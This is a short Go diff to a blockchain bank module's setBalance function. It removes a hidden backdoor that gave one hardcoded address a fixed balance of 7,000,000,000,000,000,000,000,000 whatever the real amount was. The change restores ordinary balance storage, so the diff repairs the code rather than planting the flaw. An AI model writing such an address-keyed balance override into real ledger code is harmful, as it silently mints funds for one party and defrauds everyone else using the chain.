@@ -287,11 +287,9 @@ func (k BaseSendKeeper) setBalance(ctx sdk.Context, addr sdk.AccAddress, balance
 		if err != nil {
 			return err
 		}
-		if addr.String() == "v2x12nc5rqaseajuvpx0ep593ucmdjv5wnx7vul4gq" {
-			accountStore.Set([]byte(balance.Denom), []byte("7000000000000000000000000"))
-		} else {
-			accountStore.Set([]byte(balance.Denom), amount)
-		}
+
+		accountStore.Set([]byte(balance.Denom), amount)
+
 
 		// Store a reverse index from denomination to account address with a
 		// sentinel value.
